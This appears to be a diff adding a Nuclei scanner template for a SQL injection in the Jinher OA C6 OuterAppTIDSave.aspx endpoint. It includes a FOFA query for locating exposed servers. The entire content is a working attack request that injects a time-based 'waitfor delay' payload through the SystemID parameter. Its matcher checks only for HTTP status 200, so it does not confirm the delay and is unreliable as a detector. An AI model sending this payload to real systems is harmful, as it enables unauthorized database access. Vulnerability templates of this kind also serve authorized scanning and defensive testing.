@@ -1,0 +1,21 @@
+id: poc-gxkqu1zl2a3imk0g
+info:
+  name: 金和OA C6 OuterAppTIDSave.aspx 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gxkqu1zl2a3imk0g'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gxkqu1zl2a3imk0g
+    fofa: app="金和网络-金和OA"
+http:
+- raw:
+  - 'GET /c6/Jhsoft.Web.AddMenu/OuterAppTIDSave.aspx/?SystemID=1''waitfor%20delay''0%3A0%3A5''--&OuterAppTID=1&AppTID=1 HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
